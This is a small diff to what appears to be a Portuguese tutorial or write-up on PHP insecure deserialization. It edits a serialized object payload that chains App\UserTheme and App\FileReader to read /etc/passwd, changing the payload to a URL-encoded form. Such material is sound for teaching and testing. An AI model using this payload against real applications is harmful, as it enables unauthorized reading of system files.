@@ -432,7 +432,8 @@ echo $serialized;
 Que resulta em:
 
 ```
-O:13:"App\UserTheme":1:{s:11:"extraThemes";O:14:"App\FileReader":1:{s:8:"fileName";s:11:"/etc/passwd";}}
+O:13:"App\UserTheme":1:{s:11:"extraThemes"%3BO:14:"App\FileReader":1:{s:8:"fileN
+ame"%3Bs:11:"/etc/passwd"%3B}}
 ```
 
 Então conseguimos executar o código que está dentro de `App\UserTheme::__toString`:
